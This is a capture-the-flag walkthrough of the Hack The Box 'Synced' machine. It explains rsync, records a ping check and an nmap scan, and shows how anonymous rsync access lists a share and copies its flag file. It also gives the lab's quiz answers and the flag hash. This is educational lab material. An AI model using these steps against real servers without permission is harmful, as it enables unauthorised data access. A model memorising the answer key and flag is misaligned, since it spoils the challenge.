#rsync #protocols #anonymous-access #reconnaissance 

# 0. Theory

The best known file transfer service is the **File Transfer Protocol** (**FTP**). 
The main concern with FTP is that it is a very old and slow protocol. FTP is a protocol used for copying entire files over the network from a remote server. In many cases there is a need to transfer only some changes made to a few files and not to transfer every file every single time. For these scenarios, the **rsync** protocol is generally preferred.

The changes that need to get transfered are called **deltas**. Using `deltas` to update files is an extremely efficient way to reduce the required bandwidth for the transfer as well as the required time for the transfer to complete.

The official definition of `rsync` according to the Linux [manual](https://linux.die.net/man/1/rsync) page is:
	Rsync is a fast and extraordinarily versatile file copying tool. It can copy locally, to/from another host over any remote shell, or to/from a remote rsync daemon. It offers a large number of options that control every aspect of its behavior and permit very flexible specification of the set of files to be copied. It is famous for its deltatransfer algorithm, which reduces the amount of data sent over the network by sending only the differences between the source files and the existing files in the destination. Rsync is widely used for **backups** and mirroring and as an improved copy command for everyday use.

It follows directly from the definition of `rsync` that it's a great tool for creating/maintaining backups and keeping remote machines in sync with each other. Both of these functionalities are commonly implemented in corporate environment. In these environments time is of the essence, so `rsync` is preferred due to the speedup it offers for these tasks.

The main stages of an `rsync` transfer are the following:
1. `rsync` establishes a connection to the remote host and spawns another `rsync` receiver process.
2. The sender and receiver processes compare what files have changed.
3. What has changed gets updated on the remote host.

It often happens that `rsync` is misconfigured to permit anonymous login, which can be exploited by an attacker to get access to sensitive information stored on the remote machine. Synced is a Linux box that exposes a directory over `rsync` with anonymous login. We are able to remotely access this directory using the command line tool `rsync` and retrieve the flag.


**What is the default port for rsync?**
*873*

**What is the most common command name on Linux to interact with rsync?**
*rsync*

**What credentials do you have to pass to rsync in order to use anonymous authentication?**
*None*

**What is the option to only list shares and files on rsync?**
*--list-only*


# 1. Recon

Verify target and its connectivity.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-v1vz9ikqbp]─[~]
	└──╼ [★]$ ping 10.129.16.103 -c 5
	PING 10.129.16.103 (10.129.16.103) 56(84) bytes of data.
	64 bytes from 10.129.16.103: icmp_seq=1 ttl=63 time=8.35 ms
	64 bytes from 10.129.16.103: icmp_seq=2 ttl=63 time=8.08 ms
	64 bytes from 10.129.16.103: icmp_seq=3 ttl=63 time=8.23 ms
	64 bytes from 10.129.16.103: icmp_seq=4 ttl=63 time=8.29 ms
	64 bytes from 10.129.16.103: icmp_seq=5 ttl=63 time=8.20 ms
	
	--- 10.129.16.103 ping statistics ---
	5 packets transmitted, 5 received, 0% packet loss, time 4003ms
	rtt min/avg/max/mdev = 8.077/8.227/8.354/0.092 ms

# 2. Enumeration

We will be using the following nmap flags for scanning the host's ports:

	-p- : This flag scans for all TCP ports ranging from 0-65535
	-sV : Attempts to determine the version of the service running on a port
	--min-rate : This is used to specify the minimum number of packets that Nmap should send per second; it speeds up the scan as the number goes higher

`nmap -p- --min-rate=1000 -sV {target_IP}`

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-v1vz9ikqbp]─[~]
	└──╼ [★]$ nmap --min-rate=1000 -p- -sV 10.129.16.103
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-28 14:11 CDT
	Nmap scan report for 10.129.16.103
	Host is up (0.0094s latency).
	Not shown: 65534 closed tcp ports (reset)
	PORT    STATE SERVICE VERSION
	873/tcp open  rsync   (protocol version 31)
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds

The scan shows that only port **873** is open. Moreover, Nmap informs us that the service running on this port is `rsync`.

`rsync` is an open source utility that provides fast incremental file transfer. The way `rsync` works makes it an excellent choice when there is a need to synchronize files between a computer and a storage drive and across networked computers. Because of the flexibility and speed it offers, it has become a standard Linux utility, included in all popular Linux distribution by default.

## Connecting to rsync
`rsync` is already pre-installed on almost all Linux distributions.
The generic syntax used by rsync is the following:
`rsync [OPTION] … [USER@]HOST::SRC [DEST]`

where *SRC* is the file or directory (or a list of multiple files and directories) to copy from, *DEST* is the file or directory to copy to, and square brackets indicate optional parameters.

The `[OPTION]` portion of the syntax, refers to the available options in `rsync` .

The `[USER@]` optional parameter is used when we want to access the the remote machine in an authenticated way. In this case, we don't have any valid credentials, so we will omit this portion and try an anonymous authentication.

As our first attempt we will try to simply list all the available directories to an anonymous user. Reading through the manual page we can spot the option `--list-only`, which according to the definition is used to "list the files instead of copying them".

And so we have crafted our first command that we can use to interact with the remote machine:
`rsync --list-only {target_IP}::`

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-v1vz9ikqbp]─[~]
	└──╼ [★]$ rsync --list-only 10.129.16.103::
	public         	Anonymous Share

Looking at the output, we can see that we can access a directory called `public` with the description `Anonymous Share` . It is a common practice to call shared directories just `shares`. Let's go a step further and list the files inside the `public` share.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-v1vz9ikqbp]─[~]
	└──╼ [★]$ rsync --list-only 10.129.16.103::public
	drwxr-xr-x          4,096 2022/10/24 17:02:23 .
	-rw-r--r--             33 2022/10/24 16:32:03 flag.txt

We notice a file called `flag.txt` inside the public share. Our last step is to copy/sync this file to our local machine. To do that, we simply follow the general syntax by specifying the `SRC` as `public/flag.txt` and the `DEST` as `flag.txt` to transfer the file to our local machine.
Then we just `cat` the text file's content to read the flag hash.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-v1vz9ikqbp]─[~]
	└──╼ [★]$ rsync 10.129.16.103::public/flag.txt flag.txt
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-v1vz9ikqbp]─[~]
	└──╼ [★]$ ls
	cacert.der  Documents  flag.txt  my_data   Public     Videos
	Desktop     Downloads  Music     Pictures  Templates
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-v1vz9ikqbp]─[~]
	└──╼ [★]$ cat flag.txt 
	72eaf5344ebb84908ae543a719830519



https://www.hackthebox.com/achievement/machine/2057492/515
![[Pasted image 20240828213131.png]]